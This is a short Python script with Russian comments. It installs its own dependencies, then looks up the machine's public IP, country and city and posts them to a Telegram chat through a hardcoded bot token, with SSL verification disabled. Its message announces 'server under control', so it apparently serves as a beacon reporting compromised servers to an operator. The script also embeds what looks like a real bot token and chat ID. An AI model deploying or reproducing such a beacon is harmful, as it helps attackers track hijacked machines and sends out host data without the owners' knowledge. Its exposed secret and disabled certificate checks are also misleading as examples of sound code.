import subprocess
import importlib
import sys
import hashlib
import os

# Функция для установки библиотеки
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Проверка и установка необходимых библиотек
def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Библиотека {lib} не найдена, установка...")
            install_package(lib)

# Проверка и установка библиотек перед импортом
check_and_install_libraries()

# Импортирование библиотек после установки
import requests
import urllib3

# Отключение SSL-предупреждений
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Функция для отправки сообщения в Telegram
def send_to_telegram(message):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002252120859"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
    payload = {"chat_id": tg_chat_id, "text": message}
    response = requests.post(url, json=payload, verify=False)  # Без проверки SSL
    return response.ok

# Основной процесс
def main():
    try:
        # Получаем информацию о сервере
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]
        
        # Генерируем хеш из IP
        ip_hash = hashlib.sha256(ip.encode('utf-8')).hexdigest()

        # Формируем сообщение для Telegram
        message = f"🟢 Сервер под контролем\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Страна: {country}\n"
        message += f"Город: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"  # Хеш из первых 8 символов

        # Отправляем сообщение в Telegram
        if send_to_telegram(message):
            print("Сообщение успешно отправлено!")
        else:
            print("Ошибка отправки сообщения.")
    except Exception as e:
        print(f"Ошибка: {e}")

if __name__ == "__main__":
    main()
